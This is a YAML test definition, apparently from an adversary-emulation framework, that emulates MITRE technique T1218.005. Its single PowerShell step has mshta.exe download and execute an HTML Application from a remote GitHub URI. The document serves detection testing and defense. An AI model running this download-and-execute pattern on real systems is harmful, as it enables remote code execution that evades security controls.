api_version: "2.0"
name: Invoke HTML Application - Direct download from URI
description: Executes an HTA Application by directly downloading from remote URI.
args:
    - name: mshta_file_path
      type: string
      default: $env:windir\system32\mshta.exe
    - name: hta_uri
      type: string
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
uuid: 39ceed55-f653-48ac-bd19-aceceaf525db
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1218: System Binary Proxy Execution'
    subtechniques:
        - 'T1218.005: Mshta'
requirements:
    platforms:
        - os: windows
steps:
    - name: invoke-html-application---direct-download-from-uri
      inline: Invoke-ATHHTMLApplication -HTAUri {{.Args.hta_uri}} -MSHTAFilePath {{.Args.mshta_file_path}}
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
